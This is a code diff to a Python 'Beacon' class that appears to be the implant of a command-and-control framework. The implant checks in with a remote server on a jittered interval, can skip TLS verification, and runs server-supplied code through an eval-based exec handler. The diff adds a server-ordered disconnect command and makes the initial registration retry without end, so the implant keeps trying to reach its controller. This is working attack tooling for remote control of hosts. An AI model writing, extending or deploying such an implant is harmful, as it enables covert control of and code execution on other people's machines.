@@ -27,6 +27,10 @@ def ssl_create_unverified_context():
     return ctx
 
 
+class _Disconnect(Exception):
+    """Raised by do_disconnect to cleanly stop the beacon's main loop."""
+
+
 class Beacon:
     def __init__(self, server_url, interval=5, jitter=0.2, beacon_id=None,
                  no_verify=False, key=None):
@@ -108,6 +112,8 @@ class Beacon:
             return False, f"no handler for {name}"
         try:
             return handler(args)
+        except (_Disconnect, SystemExit):
+            raise
         except Exception as e:
             return False, f"error executing {name}: {e}"
 
@@ -214,6 +220,20 @@ class Beacon:
     def do_exit(self, args):
         raise SystemExit(0)  # handled
 
+    def do_disconnect(self, args):
+        """Server-ordered disconnect: send goodbye, then stop the beacon's loop
+        and remove this session on the server side."""
+        try:
+            self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
+                                    "results": [{"id": "disconnect", "data": "server_ordered_disconnect"}]})
+        except Exception:
+            pass
+        try:
+            self._post("/disconnect", {"beacon_id": self.beacon_id})
+        except Exception:
+            pass
+        raise _Disconnect()
+
     def do_exec(self, args):
         code = args.strip()
         result = eval(code, {"__builtins__": __builtins__}, vars())
@@ -302,20 +322,29 @@ class Beacon:
     # ---------- Main loop ----------
     def start(self):
         print(f"[*] cscli beacon {self.beacon_id} -> {self.server_url}")
-        # Initial registration
-        try:
-            self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
-                                    "results": []})
-        except Exception as e:
-            print(f"[!] initial checkin failed: {e}")
-            return
+        # Initial registration with retry: if the server isn't up yet, don't
+        # exit -- enter the same reconnect loop so we keep trying until it is.
+        while True:
+            try:
+                self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
+                                        "results": []})
+                break                               # registered OK
+            except Exception as e:
+                print(f"[!] initial checkin failed: {e}; retrying in {self.interval}s")
+                time.sleep(self._sleep_interval())
         while True:
             try:
                 self._tick()
+            except _Disconnect:
+                print("[*] disconnected by server.")
+                break
             except SystemExit:
                 print("[*] exit requested. sending goodbye.")
-                self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
-                                        "results": [{"id": "bye", "data": "deliberately_exited"}]})
+                try:
+                    self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
+                                            "results": [{"id": "bye", "data": "deliberately_exited"}]})
+                except Exception:
+                    pass
                 break
             except KeyboardInterrupt:
                 print("[!] interrupted.")
